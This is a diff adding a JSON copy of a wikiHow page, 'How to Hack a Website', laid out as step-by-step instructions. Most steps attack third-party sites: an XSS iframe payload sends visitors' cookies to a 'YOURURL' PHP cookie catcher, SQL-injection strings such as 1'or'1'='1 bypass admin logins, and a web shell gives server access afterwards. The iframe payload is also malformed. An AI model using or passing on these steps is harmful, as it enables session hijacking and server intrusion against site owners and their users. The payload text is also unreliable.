@@ -1,0 +1,62 @@
+{
+  "url": "https://www.wikihow.com/Hack-a-Website",
+  "title": "How to Hack a Website",
+  "steps": [
+    {
+      "title": "Find a vulnerable site where you can post content.",
+      "content": "Find a vulnerable site where you can post content. A message board is a good example. Remember, if the site is not vulnerable to a cross-site scripting attack, then this will not work."
+    },
+    {
+      "title": "Go to create a post.",
+      "content": "Go to create a post. You will need to type some special code into the \"post\" which will capture the data of all who click on it. You'll want to test to see if the system filters out code. Post <script>window.alert(\"test\")</script> If an alert box appears when you click on your post, then the site is vulnerable to attack."
+    },
+    {
+      "title": "Create and upload your cookie catcher.",
+      "content": "Create and upload your cookie catcher. The goal of this attack is to capture a user's cookies, which allows you access to their account for websites with vulnerable logins. You'll need a cookie catcher, which will capture your target's cookies and reroute them. Upload the catcher to a website you have access to that supports PHP and is vulnerable to remote code execution via upload. An example cookie catcher code can be found in the sample section."
+    },
+    {
+      "title": "Post with your cookie catcher.",
+      "content": "Post with your cookie catcher. Input a proper code into the post which will capture the cookies and sent them to your site. You will want to put in some text after the code to reduce suspicion and keep your post from being deleted. An example code would look like <iframe frameborder=\"0\" height=\"0\" width=\"0\" src=\"javascript...:void(document.location='YOURURL/cookie catcher.PHP?c=' document.cookie)></iframe>"
+    },
+    {
+      "title": "Use the collected cookies.",
+      "content": "Use the collected cookies. After this, you can use the cookie information, which should be saved to your website, for whatever purpose you need."
+    },
+    {
+      "title": "Find a vulnerable site.",
+      "content": "Find a vulnerable site. You will need to find a vulnerable site, due to easily accessible admin login. Try searching on your favorite search engine for admin login. asp or admin login.php."
+    },
+    {
+      "title": "Login as an admin.",
+      "content": "Login as an admin . Type admin as the username and use one of several different strings as the password. These can be any one of several different strings but a common example is 1'or'1'='1 or 2'='2."
+    },
+    {
+      "title": "Be patient",
+      "content": "Be patient . This is probably going to require a little trial and error."
+    },
+    {
+      "title": "Access the website.",
+      "content": "Access the website. Eventually, you should be able to find a string that allows you admin access to a website, assuming the website is vulnerable to attack. Then, logged in as an administrator, you can perform further actions, such as uploading a web shell to gain server-side access if you can perform a file upload."
+    },
+    {
+      "title": "Learn a programming language or two.",
+      "content": "Learn a programming language or two. If you want to learn how to hack websites, you'll need to understand how computers and other technologies work. Learn to use programming languages like Python , PHP (necessary for exploiting server-side vulnerabilities), or SQL, so that you can gain better control of computers and identify vulnerabilities in systems."
+    },
+    {
+      "title": "Have basic HTML literacy.",
+      "content": "Have basic HTML literacy. You will also need to have a really good understanding of HTML and JavaScript if you want to hack websites in particular. This can take time to learn but there are lots of free ways to learn on the internet, so you will certainly have the opportunity if you want to take it."
+    },
+    {
+      "title": "Consult with whitehats.",
+      "content": "Consult with whitehats. White hats are hackers who use their powers for good, exposing security vulnerabilities and making the internet a better place for everyone. If you're wanting to learn to hack and use your powers for good or if you want to help protect your website, you might want to contact some current whitehats for advice."
+    },
+    {
+      "title": "Research hacking.",
+      "content": "Research hacking. If you're wanting to learn to hack or if you just want to protect yourself, you'll need to do a lot of research. There are so many different ways that websites can be vulnerable and the list is ever-changing, so you will need to be constantly learning."
+    },
+    {
+      "title": "Keep up to date.",
+      "content": "Keep up to date. Because the list of possible hacks is ever-changing, and new vulnerabilities are discovered, you'll need to be sure you keep up to date. Just because you’re protected from a certain type of hack now doesn't mean you'll be safe in the future!"
+    }
+  ]
+}
